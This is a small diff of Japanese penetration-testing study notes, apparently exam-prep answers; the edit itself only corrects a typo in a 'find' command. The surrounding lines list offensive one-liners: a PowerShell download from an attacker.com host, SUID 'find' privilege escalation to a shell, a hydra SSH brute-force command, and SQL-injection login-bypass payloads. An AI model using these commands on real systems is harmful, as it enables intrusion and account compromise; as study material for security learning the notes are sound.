@@ -28,7 +28,7 @@
 ・windows環境でpowershellを使ってファイルをダウンロードするコマンドは、Invoke-WebRequest -URI http://attacker.com/file.exe -outfile file.exe
 ・LinuxでSUIDバイナリ/usr/bin/findを悪用して権限昇格する方法は、find . -exec /bin/sh -p \; -quit
 ・Windows環境で管理者権限を持つサービスが弱い権限で実行されている場合の攻撃手法は、「DLL Hijacking」と「Unquoted Service Path」
-・Linux環境で最近変更されたファイルを検索するコマンドは、fin / -mtime -1
+・Linux環境で最近変更されたファイルを検索するコマンドは、find / -mtime -1
 ・SSH経由で、ダイナミックポートフォワーディングを設定するコマンドは、ssh -D 1080 user@target
 ・hydraを使ってSSHブルートフォースを行うコマンドは、hydra -l admin -P passwords.txt ssh://target
 ・SQLインジェクションで認証をバイパスする典型的なペイロードは、「admin' --」と「admin' OR '1'='1'--」である
